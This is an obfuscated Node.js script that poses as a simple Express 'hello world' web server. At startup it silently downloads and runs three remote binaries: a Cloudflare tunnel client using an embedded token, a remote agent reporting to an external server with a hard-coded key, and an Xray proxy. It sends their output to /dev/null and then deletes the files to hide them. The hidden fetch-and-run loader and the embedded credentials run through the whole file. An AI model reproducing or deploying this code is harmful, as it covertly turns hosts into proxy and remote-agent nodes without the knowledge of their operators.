const _0x1cd5ee=_0x494b;(function(_0x3fe687,_0x16240c){const _0x34a16d=_0x494b,_0x276af8=_0x3fe687();while(!![]){try{const _0x440d04=-parseInt(_0x34a16d(0x154))/0x1*(-parseInt(_0x34a16d(0x14a))/0x2)+parseInt(_0x34a16d(0x167))/0x3+parseInt(_0x34a16d(0x163))/0x4*(parseInt(_0x34a16d(0x171))/0x5)+-parseInt(_0x34a16d(0x169))/0x6+parseInt(_0x34a16d(0x16b))/0x7*(-parseInt(_0x34a16d(0x172))/0x8)+parseInt(_0x34a16d(0x16c))/0x9+parseInt(_0x34a16d(0x157))/0xa;if(_0x440d04===_0x16240c)break;else _0x276af8['push'](_0x276af8['shift']());}catch(_0x10a9be){_0x276af8['push'](_0x276af8['shift']());}}}(_0x3d02,0xbe5d3));function _0x494b(_0x42e641,_0x597a5a){const _0x3d029e=_0x3d02();return _0x494b=function(_0x494b33,_0xd1485){_0x494b33=_0x494b33-0x148;let _0x2079ad=_0x3d029e[_0x494b33];return _0x2079ad;},_0x494b(_0x42e641,_0x597a5a);}const C_T=process['env'][_0x1cd5ee(0x158)]||_0x1cd5ee(0x15e),N_S=process['env'][_0x1cd5ee(0x148)]||_0x1cd5ee(0x168),N_K=process[_0x1cd5ee(0x14e)][_0x1cd5ee(0x149)]||_0x1cd5ee(0x14c),port=process['env'][_0x1cd5ee(0x174)]||process[_0x1cd5ee(0x14e)][_0x1cd5ee(0x14b)]||0xbb8,axios=require('axios'),fs=require('fs'),{exec}=require(_0x1cd5ee(0x14f)),express=require(_0x1cd5ee(0x15d)),{createProxyMiddleware}=require(_0x1cd5ee(0x16d)),http=require(_0x1cd5ee(0x15a)),app=express(),URLS_x86_64=[_0x1cd5ee(0x15b),'https://github.com/seav1/dl/releases/download/files/nz','https://github.com/seav1/xr/releases/download/latest/xray-linux-amd64'],URLS_arm=[_0x1cd5ee(0x160),_0x1cd5ee(0x170),_0x1cd5ee(0x162)],FILES=['cf','nz','xr'],downloadFile=async(_0x4b3f02,_0x4353c6)=>{const _0x5ba280=_0x1cd5ee,_0x8c965c=fs[_0x5ba280(0x176)]('./'+_0x4353c6),_0x47d198=await axios({'url':_0x4b3f02,'method':'GET','responseType':_0x5ba280(0x159)});return _0x47d198[_0x5ba280(0x16e)][_0x5ba280(0x153)](_0x8c965c),new Promise(_0x243656=>{const _0xa296c1=_0x5ba280;_0x8c965c['on'](_0xa296c1(0x14d),_0x243656);});},executeCommand=_0x2a89eb=>{return new Promise(_0x210182=>{exec(_0x2a89eb,()=>{_0x210182();});});},deleteFiles=()=>{const _0x509e49=_0x1cd5ee;FILES[_0x509e49(0x151)](_0x5d9ea2=>{fs['unlink']('./'+_0x5d9ea2,()=>{});});},main=async()=>{const _0x13dc97=_0x1cd5ee,_0x43b582=process['arch']===_0x13dc97(0x152)?URLS_x86_64:URLS_arm;for(let _0x15dc9a=0x0;_0x15dc9a<_0x43b582[_0x13dc97(0x175)];_0x15dc9a++){await downloadFile(_0x43b582[_0x15dc9a],FILES[_0x15dc9a]),await executeCommand('chmod\x20+x\x20./'+FILES[_0x15dc9a]);}await executeCommand(_0x13dc97(0x166)+C_T+'\x20--url\x20http://localhost:8002\x20>/dev/null\x202>&1\x20&'),await executeCommand(_0x13dc97(0x164)+N_S+':443\x20-p\x20'+N_K+_0x13dc97(0x150)),await executeCommand('nohup\x20./xr\x20>/dev/null\x202>&1\x20&'),deleteFiles();};main(),app[_0x1cd5ee(0x16a)]('/',(_0x364057,_0x202f74)=>{const _0x245b04=_0x1cd5ee;_0x202f74[_0x245b04(0x173)](0xc8)[_0x245b04(0x161)]('hello\x20world');});function _0x3d02(){const _0x31c90c=['length','createWriteStream','N_S','N_K','16LKubYO','PORT','mTP8qwlGOuWO8c3TsV','finish','env','child_process','\x20--tls\x20--disable-auto-update\x20--skip-procs\x20--skip-conn\x20>/dev/null\x202>&1\x20&','forEach','x64','pipe','59318SIzFPJ','log','silent','4850930lxZrCp','C_T','stream','http','https://github.com/seav1/dl/releases/download/files/cf','createServer','express','eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiYzYyMTE0ZGYtYWYwZC00YTU2LWE1NjctMjM3NDdjMmI0M2ExIiwicyI6Ik5XWXlZakkxWVRndE5UUXpaQzAwTjJGa0xUaGxabVV0WVRReU1HWmlOMkl3T0dVeSJ9','listening\x20on\x20port\x20','https://github.com/seav1/dl/releases/download/files/cf-arm','send','https://github.com/seav1/xr/releases/download/latest/xray-linux-arm64','163796JLWrqf','nohup\x20./nz\x20-s\x20','upgrade','nohup\x20./cf\x20tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20http2\x20--no-autoupdate\x20run\x20--token\x20','1686777nTQAla','nz.seav.eu.org','5347122xvHecO','get','2820013iCCOYs','3492765eDrZXU','http-proxy-middleware','data','ws://localhost:8002','https://github.com/seav1/dl/releases/download/files/nz-arm','20qwpPyH','8DGCzpr','status','SERVER_PORT'];_0x3d02=function(){return _0x31c90c;};return _0x3d02();}const server=http[_0x1cd5ee(0x15c)](app);server['on'](_0x1cd5ee(0x165),createProxyMiddleware({'target':_0x1cd5ee(0x16f),'changeOrigin':!![],'ws':!![],'logLevel':_0x1cd5ee(0x156)})),server['listen'](port,()=>{const _0x2e7b1d=_0x1cd5ee;console[_0x2e7b1d(0x155)](_0x2e7b1d(0x15f)+port);});
